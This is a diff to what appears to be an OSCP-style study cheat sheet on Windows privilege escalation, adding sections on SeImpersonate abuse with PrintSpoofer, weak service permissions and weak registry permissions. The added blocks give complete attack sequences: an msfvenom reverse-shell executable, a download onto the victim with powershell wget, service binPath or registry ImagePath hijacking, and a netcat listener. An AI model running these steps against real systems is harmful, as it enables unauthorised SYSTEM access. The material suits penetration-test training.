@@ -717,16 +717,68 @@ sc start dns
 nc -nvlp 4444
 ```
 
-6. SeImpersonatePrivilege
+6. SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
 - https://juggernaut-sec.com/seimpersonateprivilege/#Impersonating_the_Local_SYSTEM_Account_with_Juicy_Potato
 - Whenever a user is assigned the SeImpersontatePrivilege, the user is permitted to run programs on behalf of that user to impersonate a client. 
-- Detection: whoami /priv
-- Exploitation: We can use Juicy Potato, PrintSpoofer or RoguePotato
+- Detection: whoami /priv, either SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege should be enabled
+- Exploitation: We can use Juicy Potato, PrintSpoofer or RoguePotato, RogueWinRM (needs winrm disabled), SweetPotato, and GodPotato.
 - Exploitation: Transfer PrintSpoofer.exe to victim and execute
 ```bash
 PrintSpoofer64.exe -i -c cmd
 whoami
 ```
+
+7. Weak Services Permission (Insecure Configuration File Permissions (PTOC) 
+- create a service, assign PTOC (pause, start, stop, change) permissions for a user against a service
+- Detection: 'accesschk.exe /accepteula –uwcqv ignite pentest' , returns SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG
+```bash
+sc.exe create pentest binPath= "C:\temp\service.exe"
+cd C:\Program Files (x86)\Windows Resource Kits\Tools
+subinacl.exe /service pentest /grant=msedgewin10\ignite=PTOC
+#Detection: confirm PTOC access to pentest for user Ignite 
+accesschk.exe /accepteula –uwcqv ignite pentest
+
+#on kali
+msfvenom –p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 –f exe >  shell.exe
+python –m SimpleHTTPserver 80
+
+#back to victim
+cd c:\Users\public
+powershell wget http://192.168.1.3/shell.exe -o shell.exe
+dir
+sc config pentest binPath= "C:\Users\Public\shell.exe"
+net start pentest
+
+#back to kali
+nc –lvp 8888
+whoami
+```
+
+8. Weak Services Permission ( Insecure Service Executable (PTO)
+- overwrite the system binaries with a malicious executable file in order to escalate privileges.
+- https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/
+
+9. Weak Registry Permission
+- By hijacking the Registry entries utilized by services, attackers can run their malicious payloads. Attackers may use weaknesses in registry permissions to divert from the initially stated executable to one they control upon Service start, allowing them to execute their unauthorized malware.
+- Detection: 'accesschk.exe /accepteula "authenticated users" -kvuqsw hklm\System\CurrentControlSet\services', returns KEY_ALL_ACCESS
+- Detection using WinPEASx64, ![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/bec1d1c0-f291-4e4b-9470-634bdfdfd551)
+
+```bash
+msfvenom –p window/shell_reverse_tcp lhost=192.168.1.3 lport=8888 –f exe > shell.exe
+python –m SimpleHTTPServer 80
+
+#on victim
+cd c:\Users\public
+powershell wget http://192.168.1.3/shell.exe -o shell.exe
+dir
+reg add "HKLM\system\currentcontrolset\services\pentest" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\Public\shell.exe" /f
+net start pentest
+
+#back on kali
+nc –lvp 8888
+whoami
+```
+
 
 # Linux Priv Esc
 - https://workbook.securityboat.net/resources/network-pentest-1/network-pentest/priv-escalation
